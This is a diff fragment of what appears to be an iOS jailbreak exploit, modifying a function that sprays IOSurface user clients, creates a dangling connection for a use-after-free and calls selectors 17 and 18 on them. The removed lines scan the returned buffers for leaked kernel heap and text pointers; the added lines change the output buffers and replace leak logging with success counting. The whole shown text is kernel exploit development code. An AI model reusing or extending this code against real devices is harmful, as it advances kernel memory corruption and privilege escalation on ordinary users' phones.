@@ -26964,24 +26964,9 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
             io_connect_t cDangle = 0;
             if (sym.open(svc, mach_task_self(), 0, &cDangle) == KERN_SUCCESS) {
                 kern_return_t rR = jb20_call_sel(cDangle, 17, in3, 24, calibShape, asyncCall, sym.call);
-                uint64_t db18[3] = {0, 0, 0};
+                uint64_t db18[3] = {1, 2, 3};
                 kern_return_t rD = sym.call(cDangle, 18, NULL, 0, db18, 24, NULL, NULL, NULL, NULL);
                 log([NSString stringWithFormat:@"[JB22] reg=0x%x dereg=0x%x", rR, rD]);
-                log([NSString stringWithFormat:@"[JB22] ★ sel18 OUT: [0]=0x%llx [1]=0x%llx [2]=0x%llx", db18[0], db18[1], db18[2]]);
-
-                for (int k = 0; k < 3; k++) {
-                    uint64_t v = db18[k];
-                    if (v != 0 && v != 0xFFFFFFFFFFFFFFFFULL) {
-                        if ((v & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
-                            heapPtrsFound++;
-                            log([NSString stringWithFormat:@"[JB22] ★★★ KPTR sel18[%d]=0x%llx (heap)", k, v]);
-                        }
-                        if ((v >> 40) == 0xFFFFFFF) {
-                            heapPtrsFound++;
-                            log([NSString stringWithFormat:@"[JB22] ★★★ KPTR sel18[%d]=0x%llx (ktext)", k, v]);
-                        }
-                    }
-                }
 
                 if (rR == KERN_SUCCESS && rD == KERN_SUCCESS) {
                     danglingCreated = 1;
@@ -27016,22 +27001,12 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                     if (clientSpray) {
                         for (int i = halfSpray; i < clientSprayCount && !isr_stopped(); i++) {
                             if (!clientSpray[i]) continue;
-                            uint64_t out18[3] = {0, 0, 0};
+                            uint64_t out18[3] = {1, 2, 3};
                             kern_return_t kr = sym.call(clientSpray[i], 18, NULL, 0, out18, 24, NULL, NULL, NULL, NULL);
                             if (kr == KERN_SUCCESS) {
                                 crossOK++;
                                 if (crossOK <= 10)
-                                    log([NSString stringWithFormat:@"[JB22] ★★ CROSS[%d] out=[0x%llx,0x%llx,0x%llx]", i, out18[0], out18[1], out18[2]]);
-                            }
-                            for (int j = 0; j < 3; j++) {
-                                uint64_t v = out18[j];
-                                if (v != 0 && v != 0xFFFFFFFFFFFFFFFFULL &&
-                                    ((v & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL || (v >> 40) == 0xFFFFFFF)) {
-                                    infoLeaks++;
-                                    heapPtrsFound++;
-                                    if (infoLeaks <= 20)
-                                        log([NSString stringWithFormat:@"[JB22] ★★★ LEAK spray[%d][%d]=0x%llx", i, j, v]);
-                                }
+                                    log([NSString stringWithFormat:@"[JB22] ★★ CROSS[%d] sel18=OK", i]);
                             }
                         }
                         crossClientHits = crossOK;
@@ -27040,19 +27015,9 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                         int deregOK = 0;
                         for (int i = 0; i < halfSpray && !isr_stopped(); i++) {
                             if (!clientSpray[i]) continue;
-                            uint64_t out18r[3] = {0, 0, 0};
+                            uint64_t out18r[3] = {1, 2, 3};
                             kern_return_t kr = sym.call(clientSpray[i], 18, NULL, 0, out18r, 24, NULL, NULL, NULL, NULL);
                             if (kr == KERN_SUCCESS) deregOK++;
-                            for (int j = 0; j < 3; j++) {
-                                uint64_t v = out18r[j];
-                                if (v != 0 && v != 0xFFFFFFFFFFFFFFFFULL &&
-                                    ((v & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL || (v >> 40) == 0xFFFFFFF)) {
-                                    infoLeaks++;
-                                    heapPtrsFound++;
-                                    if (infoLeaks <= 20)
-                                        log([NSString stringWithFormat:@"[JB22] ★★★ LEAK reg[%d][%d]=0x%llx", i, j, v]);
-                                }
-                            }
                         }
                         log([NSString stringWithFormat:@"[JB22] Deregister registrados: %d/%d total_leaks=%d", deregOK, halfSpray, infoLeaks]);
                     }
@@ -27074,17 +27039,12 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                         for (int i = 0; i < clientSprayCount && !isr_stopped(); i++) {
                             if (!clientSpray[i]) continue;
                             kern_return_t kr17 = jb20_call_sel(clientSpray[i], 17, in3, 24, calibShape, asyncCall, sym.call);
-                            uint64_t out18p[3] = {0, 0, 0};
+                            uint64_t out18p[3] = {1, 2, 3};
                             kern_return_t kr18 = sym.call(clientSpray[i], 18, NULL, 0, out18p, 24, NULL, NULL, NULL, NULL);
-                            for (int j = 0; j < 3; j++) {
-                                uint64_t v = out18p[j];
-                                if (v != 0 && v != 0xFFFFFFFFFFFFFFFFULL &&
-                                    ((v & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL || (v >> 40) == 0xFFFFFFF)) {
-                                    postLeaks++;
-                                    heapPtrsFound++;
-                                    if (postLeaks <= 20)
-                                        log([NSString stringWithFormat:@"[JB22] ★★★ POST spray[%d][%d]=0x%llx kr17=0x%x kr18=0x%x", i, j, v, kr17, kr18]);
-                                }
+                            if (kr17 == KERN_SUCCESS && kr18 == KERN_SUCCESS) {
+                                postLeaks++;
+                            } else if (kr17 != KERN_SUCCESS && postLeaks == 0) {
+                                log([NSString stringWithFormat:@"[JB22] POST spray[%d] kr17=0x%x kr18=0x%x", i, kr17, kr18]);
                             }
                         }
                         log([NSString stringWithFormat:@"[JB22] Post-UAF leaks: %d", postLeaks]);
